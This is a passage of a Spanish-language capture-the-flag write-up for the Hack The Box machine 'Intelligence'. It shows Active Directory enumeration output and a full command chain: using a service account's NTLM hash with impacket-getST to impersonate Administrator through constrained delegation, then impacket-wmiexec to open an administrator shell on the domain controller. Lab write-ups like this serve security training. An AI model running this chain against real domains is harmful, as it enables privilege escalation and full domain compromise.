+  -additional-ticket ticket.ccache
+                        include a forwardable service
+                        ticket in a S4U2Proxy request
+                        for RBCD + KCD Kerberos only
+  -ts                   Adds timestamp to every logging
+                        output
+  -debug                Turn DEBUG output ON
+  -u2u                  Request User-to-User ticket
+  -self                 Only do S4U2self, no S4U2proxy
+  -force-forwardable    Force the service ticket
+                        obtained through S4U2Self to be
+                        forwardable. For best results,
+                        the -hashes and -aesKey values
+                        for the specified -identity
+                        should be provided. This allows
+                        impresonation of protected users
+                        and bypass of &quot;Kerberos-only&quot;
+                        constrained delegation
+                        restrictions. See CVE-2020-17049
+
+authentication:
+  -hashes LMHASH:NTHASH
+                        NTLM hashes, format is
+                        LMHASH:NTHASH
+  -no-pass              don't ask for password (useful
+                        for -k)
+  -k                    Use Kerberos authentication.
+                        Grabs credentials from ccache
+                        file (KRB5CCNAME) based on
+                        target parameters. If valid
+                        credentials cannot be found, it
+                        will use the ones specified in
+                        the command line
+  -aesKey hex key       AES key to use for Kerberos
+                        Authentication (128 or 256 bits)
+  -dc-ip ip address     IP Address of the domain
+                        controller. If omitted it use
+                        the domain part (FQDN) specified
+                        in the target parameter
+</code></pre></div></div>
+<ul>
+<li>Pero necesitamos el <code>SPN</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ pywerview get-netcomputer -u 'Ted.Graves' -t 10.10.10.248 --full-data
+Password:
+objectclass:                    top, person, organizationalPerson, user, computer, msDS-GroupManagedServiceAccount
+cn:                             svc_int
+distinguishedname:              CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=htb
+instancetype:                   4
+whencreated:                    2021-04-19 00:49:58+00:00
+whenchanged:                    2024-08-12 04:08:48+00:00
+usncreated:                     12846
+usnchanged:                     102619
+name:                           svc_int
+objectguid:                     {f180a079-f326-49b2-84a1-34824208d642}
+useraccountcontrol:             WORKSTATION_TRUST_ACCOUNT, TRUSTED_TO_AUTH_FOR_DELEGATION
+badpwdcount:                    0
+codepage:                       0
+countrycode:                    0
+badpasswordtime:                2024-08-12 04:08:16.285681+00:00
+lastlogoff:                     1601-01-01 00:00:00+00:00
+lastlogon:                      2024-08-12 04:08:48.848196+00:00
+localpolicyflags:               0
+pwdlastset:                     2024-08-12 03:56:15.020052+00:00
+primarygroupid:                 515
+objectsid:                      S-1-5-21-4210132550-3389855604-3437519686-1144
+accountexpires:                 9999-12-31 23:59:59.999999+00:00
+logoncount:                     1
+samaccountname:                 svc_int$
+samaccounttype:                 805306369
+dnshostname:                    svc_int.intelligence.htb
+objectcategory:                 CN=ms-DS-Group-Managed-Service-Account,CN=Schema,CN=Configuration,DC=intelligence,DC=htb
+iscriticalsystemobject:         False
+dscorepropagationdata:          1601-01-01 00:00:00+00:00
+lastlogontimestamp:             2024-08-12 04:08:48.848196+00:00
+msds-allowedtodelegateto:       WWW/dc.intelligence.htb
+msds-supportedencryptiontypes:  28
+msds-managedpasswordid:         010000004b44534b020000006a010000130000000800000059ae9d4f448f56bf92a5f4082ed6b61100000000220000002200...
+msds-managedpasswordpreviousid: 010000004b44534b020000006a010000110000000000000059ae9d4f448f56bf92a5f4082ed6b61100000000220000002200...
+msds-managedpasswordinterval:   30
+msds-groupmsamembership:        010004801400000000000000000000002400000001020000000000052000000020020000040050000200000000002400ff01... 
+
+objectclass:                   top, person, organizationalPerson, user, computer
+cn:                            DC
+usercertificate:               308205fb308204e3a00302010202137100000002cc9c8450ce507e1c000000000002300d06092a864886f70d01010b050...
+distinguishedname:             CN=DC,OU=Domain Controllers,DC=intelligence,DC=htb
+instancetype:                  4
+whencreated:                   2021-04-19 00:42:41+00:00
+whenchanged:                   2024-08-11 23:33:15+00:00
+displayname:                   DC$
+usncreated:                    12293
+memberof:                      CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=intelligence,DC=htb, 
+                               CN=Cert Publishers,CN=Users,DC=intelligence,DC=htb
+usnchanged:                    102437
+name:                          DC
+objectguid:                    {f28de281-fd79-40c5-a77b-1252b80550ed}
+useraccountcontrol:            SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
+badpwdcount:                   0
+codepage:                      0
+countrycode:                   0
+badpasswordtime:               1601-01-01 00:00:00+00:00
+lastlogoff:                    1601-01-01 00:00:00+00:00
+lastlogon:                     2024-08-12 00:32:44.441931+00:00
+localpolicyflags:              0
+pwdlastset:                    2024-08-11 23:32:46.261578+00:00
+primarygroupid:                516
+objectsid:                     S-1-5-21-4210132550-3389855604-3437519686-1000
+accountexpires:                9999-12-31 23:59:59.999999+00:00
+logoncount:                    323
+samaccountname:                DC$
+samaccounttype:                805306369
+operatingsystem:               Windows Server 2019 Datacenter
+operatingsystemversion:        10.0 (17763)
+serverreferencebl:             CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=intelligence,DC=htb
+dnshostname:                   dc.intelligence.htb
+ridsetreferences:              CN=RID Set,CN=DC,OU=Domain Controllers,DC=intelligence,DC=htb
+serviceprincipalname:          ldap/DC/intelligence, HOST/DC/intelligence, RestrictedKrbHost/DC, HOST/DC, ldap/DC, 
+                               Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/dc.intelligence.htb, 
+                               ldap/dc.intelligence.htb/ForestDnsZones.intelligence.htb, 
+                               ldap/dc.intelligence.htb/DomainDnsZones.intelligence.htb, DNS/dc.intelligence.htb, 
+                               GC/dc.intelligence.htb/intelligence.htb, RestrictedKrbHost/dc.intelligence.htb, 
+                               RPC/195d59db-c263-4e51-b00b-4d6ce30136ea._msdcs.intelligence.htb, 
+                               HOST/dc.intelligence.htb/intelligence, HOST/dc.intelligence.htb, 
+                               HOST/dc.intelligence.htb/intelligence.htb, 
+                               E3514235-4B06-11D1-AB04-00C04FC2DCD2/195d59db-c263-4e51-b00b-4d6ce30136ea/intelligence.htb, 
+                               ldap/195d59db-c263-4e51-b00b-4d6ce30136ea._msdcs.intelligence.htb, 
+                               ldap/dc.intelligence.htb/intelligence, ldap/dc.intelligence.htb, 
+                               ldap/dc.intelligence.htb/intelligence.htb
+objectcategory:                CN=Computer,CN=Schema,CN=Configuration,DC=intelligence,DC=htb
+iscriticalsystemobject:        True
+dscorepropagationdata:         2021-04-19 00:42:42+00:00, 1601-01-01 00:00:01+00:00
+lastlogontimestamp:            2024-08-11 23:33:15.886587+00:00
+msds-supportedencryptiontypes: 28
+msds-generationid:             1b056d02cbe351ba...
+msdfsr-computerreferencebl:    CN=DC,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=intelligence,DC=htb 
+</code></pre></div></div>
+<ul>
+<li><p>Ahora lo impersonamos al administrador.</p>
+</li>
+<li><p>Bueno esto significa que nos tenemos que sincronizar al reloj del DC.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ impacket-getST -spn WWW/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int -hashes :4c395675187a74271de7c4af867ad417
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+</code></pre></div></div>
+<ul>
+<li>Ahora nos sincronizamos.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ sudo ntpdate -s 10.10.10.248
+</code></pre></div></div>
+<ul>
+<li>Y listo.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ impacket-getST -spn WWW/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int -hashes :4c395675187a74271de7c4af867ad417
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
+</code></pre></div></div>
+<ul>
+<li>Ahora nos autenticamos con el <code>ccache</code> y exportamos la variable de entorno.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ export KRB5CCNAME=Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
+</code></pre></div></div>
+<ul>
+<li>Ahora nos autenticamos y vemos la flag.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ impacket-wmiexec dc.intelligence.htb -k -no-pass
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\&gt;whoami
+intelligence\administrator
+
+C:\&gt;type C:\Users\Administrator\Desktop\root.txt
+1b2c72e788bdcc6d73cb1b9175fb420c
+
+C:\&gt;
+</code></pre></div></div>
+</article></div></main>
+<footer class="footer wrap"><div><b>MR<em>7</em></b><div>Cybersecurity notes &amp; writeups.</div></div><div class="footer-links"><a href="https://github.com/MikeRega7">GitHub</a><a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278">LinkedIn</a><a href="https://www.instagram.com/_miguelitornuno7">Instagram</a></div></footer>
+<script src="/app.js?v=10"></script></body></html>
